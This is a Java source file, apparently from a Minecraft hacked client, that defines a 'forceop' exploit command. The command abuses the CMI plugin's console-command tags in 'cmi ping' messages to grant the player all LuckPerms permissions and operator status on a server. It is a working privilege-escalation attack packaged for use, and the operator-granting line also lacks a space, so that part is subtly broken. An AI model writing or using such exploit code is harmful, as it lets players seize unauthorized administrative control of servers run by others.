package net.paradise_client.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.commands.SharedSuggestionProvider;
import net.paradise_client.command.Command;
import net.paradise_client.command.CommandManager;

import java.util.Objects;

/**
 * CMI exploit to run any command as the console, was patched long ago
 * Originally found by idk who, I found it on some forums
 */
public class ForceOPCommand extends Command {

  /**
   * Constructs a new instance of the ForceOPCommand class.
   */
  public ForceOPCommand() {
    super("forceop", "Gives OP thru CMI console command sender exploit", CommandManager.CommandCategory.EXPLOIT);
  }

  /**
   * Builds the command using Brigadier's command builder.
   */
  @Override public void build(LiteralArgumentBuilder<SharedSuggestionProvider> root) {
    root.executes((context -> {
      // Sends a CMI console command to set the player's permissions to true using LuckPerms.
      Objects.requireNonNull(getMinecraftClient().getConnection())
        .sendCommand("cmi ping <T>Click here to get luckperms</T><CC>lp user " +
          getMinecraftClient().getUser().getName() +
          " p set * true</CC>");
      // Sends a CMI console command to grant the player OP status.
      Objects.requireNonNull(getMinecraftClient().getConnection())
        .sendCommand("cmi ping <T>Click here to get OP</T><CC>op" +
          getMinecraftClient().getUser().getName() +
          "</CC>");
      // Returns a success status.
      return SINGLE_SUCCESS;
    }));
  }
}
